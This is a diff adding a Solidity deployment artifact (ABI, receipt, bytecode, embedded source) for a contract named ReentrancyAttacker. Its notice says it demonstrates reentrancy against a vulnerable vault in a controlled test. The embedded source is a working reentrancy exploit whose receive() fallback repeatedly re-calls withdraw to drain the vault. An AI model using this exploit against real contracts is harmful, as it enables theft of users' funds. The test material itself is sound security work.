@@ -1,0 +1,141 @@
+{
+  "address": "0x7F52F9C167D157637f0eF6a432a326fae83aECec",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "vaultAddress",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "attackDeposit",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "attackerBalance",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "reentryCount",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "vault",
+      "outputs": [
+        {
+          "internalType": "contract IVault",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0xbef583bb1f1d6d5e4830e3221b9418a2b9f2e0871faf3f2bed9f1ef8669eacaf",
+  "receipt": {
+    "to": null,
+    "from": "0x6016979Ba1A7bD7aF23923FbA73B9cF40e124C3E",
+    "contractAddress": "0x7F52F9C167D157637f0eF6a432a326fae83aECec",
+    "transactionIndex": 0,
+    "gasUsed": "22655",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x944f87cf7f642a77005e3dcd586fcc137c57caba95508f5d033e29a509bbef62",
+    "transactionHash": "0xbef583bb1f1d6d5e4830e3221b9418a2b9f2e0871faf3f2bed9f1ef8669eacaf",
+    "logs": [],
+    "blockNumber": 2741070,
+    "cumulativeGasUsed": "22655",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xBCB3FF016c54FCE9b26eD1bB35C0063f1ED766BD"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "1cc62dbdd701f0cb98655b355ba0ee3a",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackDeposit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackerBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reentryCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vault\",\"outputs\":[{\"internalType\":\"contract IVault\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"notice\":\"Demonstrates reentrancy against VulnerableVault in a controlled test.\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ReentrancyAttacker.sol\":\"ReentrancyAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/ReentrancyAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity >=0.8.0 <0.9.0;\\n\\ninterface IVault {\\n    function deposit() external payable;\\n\\n    function withdraw() external;\\n}\\n\\n/// @notice Demonstrates reentrancy against VulnerableVault in a controlled test.\\ncontract ReentrancyAttacker {\\n    IVault public immutable vault;\\n    uint256 public attackDeposit;\\n    uint256 public reentryCount;\\n\\n    constructor(address vaultAddress) {\\n        require(vaultAddress != address(0), \\\"Attacker: zero vault address\\\");\\n        vault = IVault(vaultAddress);\\n    }\\n\\n    function attack() external payable {\\n        require(msg.value > 0, \\\"Attacker: attack value must be positive\\\");\\n        require(address(this).balance == msg.value, \\\"Attacker: withdraw existing balance first\\\");\\n\\n        attackDeposit = msg.value;\\n        reentryCount = 0;\\n\\n        vault.deposit{value: msg.value}();\\n        vault.withdraw();\\n    }\\n\\n    receive() external payable {\\n        require(msg.sender == address(vault), \\\"Attacker: unexpected sender\\\");\\n\\n        // Stop naturally when the vault no longer holds another full withdrawal.\\n        if (address(vault).balance >= attackDeposit) {\\n            reentryCount += 1;\\n            vault.withdraw();\\n        }\\n    }\\n\\n    function attackerBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0xf72327313c611d8fb0a9440f5167f2f6b58eb5a8142cebf095f9129c51a03964\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x60a060405234801561001057600080fd5b5060405161055538038061055583398101604081905261002f9161009a565b6001600160a01b0381166100895760405162461bcd60e51b815260206004820152601c60248201527f41747461636b65723a207a65726f207661756c74206164647265737300000000604482015260640160405180910390fd5b6001600160a01b03166080526100ca565b6000602082840312156100ac57600080fd5b81516001600160a01b03811681146100c357600080fd5b9392505050565b60805161044f61010660003960008181605e0152818160d50152818161011e015281816101ff0152818161030b015261037f015261044f6000f3fe60806040526004361061004e5760003560e01c80632b8ed6e5146101975780633510e6a0146101b957806353b38169146101cf5780639e5faafc146101e5578063fbfa77cf146101ed57600080fd5b3661019257336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146100d05760405162461bcd60e51b815260206004820152601b60248201527f41747461636b65723a20756e65787065637465642073656e646572000000000060448201526064015b60405180910390fd5b6000547f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316311061019057600180600082825461011591906103f2565b925050819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561017757600080fd5b505af115801561018b573d6000803e3d6000fd5b505050505b005b600080fd5b3480156101a357600080fd5b50475b6040519081526020015b60405180910390f35b3480156101c557600080fd5b506101a660005481565b3480156101db57600080fd5b506101a660015481565b610190610239565b3480156101f957600080fd5b506102217f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020016101b0565b600034116102995760405162461bcd60e51b815260206004820152602760248201527f41747461636b65723a2061747461636b2076616c7565206d75737420626520706044820152666f73697469766560c81b60648201526084016100c7565b3447146102fa5760405162461bcd60e51b815260206004820152602960248201527f41747461636b65723a207769746864726177206578697374696e672062616c616044820152681b98d948199a5c9cdd60ba1b60648201526084016100c7565b3460008190555060006001819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561036457600080fd5b505af1158015610378573d6000803e3d6000fd5b50505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103d857600080fd5b505af11580156103ec573d6000803e3d6000fd5b50505050565b8082018082111561041357634e487b7160e01b600052601160045260246000fd5b9291505056fea26469706673582212201ddb6c9c3640ef711241d85b40bb135fe83b90e0e3d6523ef7ead2b448f74a3164736f6c63430008140033",
+  "deployedBytecode": "0x60806040526004361061004e5760003560e01c80632b8ed6e5146101975780633510e6a0146101b957806353b38169146101cf5780639e5faafc146101e5578063fbfa77cf146101ed57600080fd5b3661019257336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146100d05760405162461bcd60e51b815260206004820152601b60248201527f41747461636b65723a20756e65787065637465642073656e646572000000000060448201526064015b60405180910390fd5b6000547f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316311061019057600180600082825461011591906103f2565b925050819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561017757600080fd5b505af115801561018b573d6000803e3d6000fd5b505050505b005b600080fd5b3480156101a357600080fd5b50475b6040519081526020015b60405180910390f35b3480156101c557600080fd5b506101a660005481565b3480156101db57600080fd5b506101a660015481565b610190610239565b3480156101f957600080fd5b506102217f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020016101b0565b600034116102995760405162461bcd60e51b815260206004820152602760248201527f41747461636b65723a2061747461636b2076616c7565206d75737420626520706044820152666f73697469766560c81b60648201526084016100c7565b3447146102fa5760405162461bcd60e51b815260206004820152602960248201527f41747461636b65723a207769746864726177206578697374696e672062616c616044820152681b98d948199a5c9cdd60ba1b60648201526084016100c7565b3460008190555060006001819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561036457600080fd5b505af1158015610378573d6000803e3d6000fd5b50505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103d857600080fd5b505af11580156103ec573d6000803e3d6000fd5b50505050565b8082018082111561041357634e487b7160e01b600052601160045260246000fd5b9291505056fea26469706673582212201ddb6c9c3640ef711241d85b40bb135fe83b90e0e3d6523ef7ead2b448f74a3164736f6c63430008140033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "notice": "Demonstrates reentrancy against VulnerableVault in a controlled test.",
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 667,
+        "contract": "contracts/ReentrancyAttacker.sol:ReentrancyAttacker",
+        "label": "attackDeposit",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 669,
+        "contract": "contracts/ReentrancyAttacker.sol:ReentrancyAttacker",
+        "label": "reentryCount",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_uint256"
+      }
+    ],
+    "types": {
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
